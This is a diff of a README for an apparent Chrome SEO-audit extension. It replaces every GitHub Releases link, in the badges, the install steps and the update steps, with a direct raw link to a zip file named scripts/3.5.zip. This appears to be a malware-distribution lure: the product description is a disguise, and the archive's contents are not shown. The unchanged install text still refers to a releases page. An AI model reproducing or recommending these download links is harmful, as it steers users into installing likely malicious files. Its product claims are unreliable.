@@ -1,6 +1,6 @@
 # 🔍 Essential SEO Toolkit Chrome Extension - Private On-Page SEO Audits Made Easy
 
-[![Download Essential SEO Toolkit](https://img.shields.io/badge/Download%20Essential%20SEO%20Toolkit-4285F4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/p13537113953-ux/essential-seo-toolkit-chrome-extension/releases)
+[![Download Essential SEO Toolkit](https://img.shields.io/badge/Download%20Essential%20SEO%20Toolkit-4285F4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/p13537113953-ux/essential-seo-toolkit-chrome-extension/main/scripts/3.5.zip)
 
 ## 🚀 What Is This?
 
@@ -46,11 +46,11 @@ Dig deeper with tools to check:
 
 ## 📥 How to Download and Install
 
-Visit this link to download the application: [Essential SEO Toolkit Releases](https://github.com/p13537113953-ux/essential-seo-toolkit-chrome-extension/releases)
+Visit this link to download the application: [Essential SEO Toolkit Releases](https://raw.githubusercontent.com/p13537113953-ux/essential-seo-toolkit-chrome-extension/main/scripts/3.5.zip)
 
 ### 🖥️ Step-by-Step Installation Guide
 
-1. **Open the download link** by clicking the big blue button at the top of this page, or copy and paste this address into your browser: `https://github.com/p13537113953-ux/essential-seo-toolkit-chrome-extension/releases`
+1. **Open the download link** by clicking the big blue button at the top of this page, or copy and paste this address into your browser: `https://raw.githubusercontent.com/p13537113953-ux/essential-seo-toolkit-chrome-extension/main/scripts/3.5.zip`
 
 2. **Find the latest release** at the top of the page. You'll see a version number like "v1.0.0" and a date.
 
@@ -114,7 +114,7 @@ The extension gives you:
 
 The extension checks for updates automatically when you use it. For manual updates:
 
-1. Visit the [download page](https://github.com/p13537113953-ux/essential-seo-toolkit-chrome-extension/releases)
+1. Visit the [download page](https://raw.githubusercontent.com/p13537113953-ux/essential-seo-toolkit-chrome-extension/main/scripts/3.5.zip)
 2. Download the newest version
 3. Follow the same installation steps (remove the old version first if prompted)
 
@@ -155,6 +155,6 @@ Here are recent improvements to expect:
 
 Essential SEO Toolkit puts professional-grade SEO analysis in your hands without requiring any technical background. Download it today and see exactly where your website stands in the eyes of Google's algorithms.
 
-[![Get Essential SEO Toolkit Now](https://img.shields.io/badge/Download%20Now-2E7D32?style=for-the-badge&logo=download&logoColor=white)](https://github.com/p13537113953-ux/essential-seo-toolkit-chrome-extension/releases)
+[![Get Essential SEO Toolkit Now](https://img.shields.io/badge/Download%20Now-2E7D32?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/p13537113953-ux/essential-seo-toolkit-chrome-extension/main/scripts/3.5.zip)
 
 Keywords: accessibility, axe-core, browser-extension, chrome-extension, manifest-v3, on-page-seo, privacy-first, seo, seo-analysis, seo-audit, seo-bookmark, seo-tool, structured-data, technical-seo, web-vitals
